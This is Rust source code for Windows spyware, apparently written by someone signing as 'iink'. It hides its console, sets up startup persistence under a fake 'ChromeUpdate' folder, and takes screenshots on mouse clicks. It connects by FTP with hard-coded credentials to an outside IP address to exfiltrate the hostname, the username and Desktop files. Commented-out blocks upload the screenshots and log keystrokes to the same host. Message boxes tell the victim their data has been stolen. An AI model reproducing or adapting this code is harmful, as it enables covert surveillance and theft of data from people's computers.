#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
extern crate ftp;


mod init;

use device_query::{DeviceState};
use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA,MB_OK,MB_SERVICE_NOTIFICATION,MB_ICONWARNING,MB_TOPMOST};
use std::fs;
use std::io::Read;
use std::time::{SystemTime};
use ftp::FtpStream;
use winreg::{self, enums::{HKEY_LOCAL_MACHINE}};
use std::io::Cursor;

async fn screenshot() ->Result<(),Box<dyn std::error::Error>> {
    let one_second = std::time::Duration::new(1, 0);
    let one_frame = one_second / 60;

    let display = scrap::Display::primary()?;
    let mut capturer = scrap::Capturer::new(display).expect("Couldn't begin capture.");
    let (w, h) = (capturer.width(), capturer.height());

    loop {
        let device_state = DeviceState::new();
        
        if !device_state.query_pointer().button_pressed.is_empty() {
            if *device_state.query_pointer().button_pressed.get(1).unwrap() == true {
                // Wait until there's a frame.
   
               let buffer = match capturer.frame() {
                   Ok(buffer) => buffer,
                   Err(error) => {
                       if error.kind() == std::io::ErrorKind::WouldBlock {
                           // Keep spinning.
                           std::thread::sleep(one_frame);
                           continue;
                       } else {
                           panic!("Error: {}", error);
                       }
                   }
               };
               
               let mut bitflipped = Vec::with_capacity(w * h * 4);
               let stride = buffer.len() / h;
   
               for y in 0..h {
                   for x in 0..w {
                       let i = stride * y + 4 * x;
                       bitflipped.extend_from_slice(&[
                           buffer[i + 2],
                           buffer[i + 1],
                           buffer[i],
                           255,
                       ]);
                   }
               }
               let epoch = std::time::SystemTime::now().duration_since(std::time::SystemTime::UNIX_EPOCH)?.as_micros();
               repng::encode(
                   std::fs::File::create(format!("{}.png",epoch)).unwrap(),
                   w as u32,
                   h as u32,
                   &bitflipped,
               ).unwrap();
               /*
               let file = format!("{}.png",&epoch).as_str().to_owned();

               let params = [("files",file), ("token", "madebyiink".to_owned())];

               let mut buf2 = vec![0;2811];

               std::fs::File::open("client.pem")?.read(&mut buf2)?;
               let cert = reqwest::Certificate::from_pem(&buf2)?;
               println!("{:?}",cert);

               let client = reqwest::Client::builder();
               let client = client.add_root_certificate(cert);
            
               let client = client.build()?;

               let req = client.post(format!("https://18.159.96.157:8000/upload"));
               
               let mut result = vec![0; 5000000];
               std::fs::File::open(format!("{}.png",epoch).as_str())?.read(&mut result)?;
               let req = req.body(result.to_owned());
               let req = req.form(&params);
            //    std::io::copy(&mut std::fs::File::open(format!("{}.png",epoch).as_str())?,&mut std::fs::File::open("dump.png")?)?;
               req.send().await?;*/

               return Ok(())
           }
        }
        
       
    }
    Ok(())
}
/* 
async fn listen_key() ->Result<(),Box<dyn std::error::Error>>  {
    let mut log_strm = std::fs::File::options().append(true).open("log.txt")?;

    let mut key_sender = std::net::TcpStream::connect("18.159.96.157:353")?;

    let mut buffer = String::new();
    let device_state = DeviceState::new();
    let keys:Vec<Keycode> = device_state.get_keys();
    loop {
        // NOTE: Use event listeners on device_query, fucking hell

        let client = reqwest::Client::new();
        
        let req = client.post("http://18.159.96.157:352/info");


        for i in keys.iter() {
                if i == &Keycode::Enter {
                    println!("Yes.");
                    log_strm.write_all(format!("{}\n",buffer).to_owned().as_bytes())?;
                    key_sender.write(buffer.as_bytes())?;
                    buffer = String::new();
                    break;
                }

                println!("{}",String::from(format!("{:?}",i)).as_str());
                buffer.push_str(String::from(format!("{:?}",i)).as_str()); 
            // println!("{}",i);   
        }
        
        
    }
    


    Ok(())
}*/

async fn do_mal() -> Result<(),Box<dyn std::error::Error>> {
    println!("Hello!");
    let mut ss = tokio::time::interval(std::time::Duration::from_secs(10));

        loop {
            ss.tick().await;
        
            screenshot().await?;

            

        }
    Ok(())
}

fn let_there_be_doom() -> Result<(),Box<dyn std::error::Error>> {
    let mut start_day = String::new();
    let prof = std::env::var("USERPROFILE")?;
    std::fs::File::options().read(true).open(format!("{}\\ChromeUpdate\\log.txt",prof))?.read_to_string(&mut start_day)?;
    let unix_start = start_day.parse::<u64>().unwrap();
    let unix_today = ((SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs() / 60) / 60 )/ 24;
    let diff = unix_today - unix_start;

    unsafe {
        MessageBoxA(None, "It's just a cigarette, and it harms your pretty lungs.", "cigarette_", MB_OK | MB_TOPMOST | MB_ICONWARNING | MB_SERVICE_NOTIFICATION);
        MessageBoxA(None, "Well, it's only twice a week so there's not much of a chance.", "cigarette_", MB_OK | MB_TOPMOST | MB_ICONWARNING | MB_SERVICE_NOTIFICATION);

        MessageBoxA(None, "It's just a cigarette, it'll soon be only ten.", "cigarette_", MB_OK | MB_TOPMOST | MB_ICONWARNING | MB_SERVICE_NOTIFICATION);
        MessageBoxA(None, "Honey, can't you trust me? When I want to stop, I can.", "cigarette_", MB_OK | MB_TOPMOST | MB_ICONWARNING | MB_SERVICE_NOTIFICATION);
    }
    let hlm = winreg::RegKey::predef(HKEY_LOCAL_MACHINE);
    let comp_skey = hlm.open_subkey(r#"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName"#)?;
    let hostname:String = comp_skey.get_value("ComputerName")?;
    let username = std::env::var("USERNAME")?;

    let mut ftp_stream = FtpStream::connect("18.159.96.157:21")?;
    let _ = ftp_stream.login("iink","21122007");
    ftp_stream.get_ref().set_read_timeout(Some(std::time::Duration::new(60,0)))?;
    ftp_stream.get_ref().set_write_timeout(Some(std::time::Duration::new(60,0)))?;

    println!("Current directory: {}", ftp_stream.pwd().unwrap());
    let workdir = format!("{}:{}",hostname,username).as_str().to_owned();
    ftp_stream.mkdir(&workdir)?;

    ftp_stream.cwd(&workdir)?;
    let mut reader = Cursor::new("Hello from the Rust \"ftp\" crate!".as_bytes());

    ftp_stream.put("aaaa",&mut reader)?;
    for entry in fs::read_dir(format!("{}\\Desktop",prof))? {
        let entry = entry?;
        let path = entry.path();
        // Create ftp connection and send files
        if path.to_str().unwrap().contains("ssah") {
            if path.metadata()?.is_file() {
                println!("{}",path.to_str().unwrap());
                // ftp_stream.put(path.to_str().unwrap(), &mut reader)?;
            }
        }
    }
    ftp_stream.quit()?;
    unsafe {
        MessageBoxA(None, "Hello friend! You don't know me, but at this point I think I have an idea of you.", "iink", MB_OK | MB_TOPMOST | MB_ICONWARNING | MB_SERVICE_NOTIFICATION);
        MessageBoxA(None, format!("Your computer, sadly got infected by me. Poor thing! I have been watching you for {} days.",diff), "iink", MB_OK | MB_TOPMOST | MB_ICONWARNING | MB_SERVICE_NOTIFICATION);
        MessageBoxA(None, "I already have stolen some, if not, most of your data. I am also damaging the system as you are reading this message.", "iink", MB_OK | MB_TOPMOST | MB_ICONWARNING | MB_SERVICE_NOTIFICATION);
        MessageBoxA(None, "Mail me on diskdd@tuta.io for further questions, please. x\n -iink", "iink", MB_OK | MB_TOPMOST | MB_ICONWARNING | MB_SERVICE_NOTIFICATION);
    }
    Ok(())
}

#[tokio::main()]
async fn main() -> Result<(),Box<dyn std::error::Error>> {
    println!("Hello, world!");

    if init::check_startup().unwrap() == true {
        init::create_startup().unwrap();
        init::create_env().unwrap();
        init::create_id().await?;
    }
    else {
        println!("Already initialized.");

        let_there_be_doom()?;

        do_mal().await?;
        
    }


    Ok(())

}
